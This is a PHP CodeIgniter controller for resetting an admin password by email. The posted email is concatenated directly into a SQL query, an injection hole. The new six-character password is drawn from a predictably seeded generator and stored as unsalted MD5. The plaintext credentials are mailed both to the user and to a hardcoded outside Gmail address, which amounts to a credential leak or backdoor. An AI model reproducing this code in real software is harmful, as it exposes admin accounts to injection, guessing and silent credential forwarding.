<?php
class Forgot extends CI_Controller {

/*

    function index() {
    	
    	$this->load->view('admin/login_view');
    }
*/
						   
 	
   function forgot_pass(){
   
       function randomtext($len) {
		        srand(date("s") );
		       
		       $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		       $chars.= "1234567890"; //  random
		       $ret_str = "";
		       $num = strlen($chars);
		       for($i=0; $i < $len; $i++) {
		       	$ret_str.= $chars[rand()%$num];
		       }
		   return $ret_str;
		}

    	if($this->input->post('forgot')!=NULL){
    		
    		$email_forgot = $this->input->post('email');
    		
    		$this->db->select('*');
			$this->db->from('admin');
			$this->db->where('admin_email = ' . "'" . $email_forgot . "'"); 
    			
    			$query = $this->db->get();
    			if($query->num_rows() == 1)
    			{
				   foreach ($query->result() as $row)
				   {
					  $id 	 = $row->admin_id;  
				      $user  = $row->admin_user;
				      $email = $row->admin_email;
				      
			      }
			      				      	
			      	 $new_pass=randomtext(6);
			      	
				      $data = array(
					  	'admin_pass' => md5("$new_pass"),
					  );
					  
				      $this->db->where('admin_id', $id);
				      $this->db->update('admin', $data);
				      
				      //send mail
					$to = "regulators13@gmail.com".',';
		            $to .= "$email".',';
				 	
					//define the subject of the email
					$subject = "Forgot Username / Password admin LABS "; 
					//define the message to be sent. Each line should be separated with \n
					$messages = "User : ".$user ." \n\n Password: ". ($new_pass) ."\n\n "; 
			
					mail($to, $subject, $messages);
					
				     	echo "<script>alert('Send data success.');</script>";
						echo "<script>window.location.href = '" . base_url() . "admin/login';</script>";
				    	 
				}else{
					//for using the base_url() function
						echo "<script>alert('Invalid Email !');</script>";
						echo "<script>window.location.href = '" . base_url() . "admin/login';</script>";
					
				} 
			}
			
    }// end function forgot
       
  
}// end class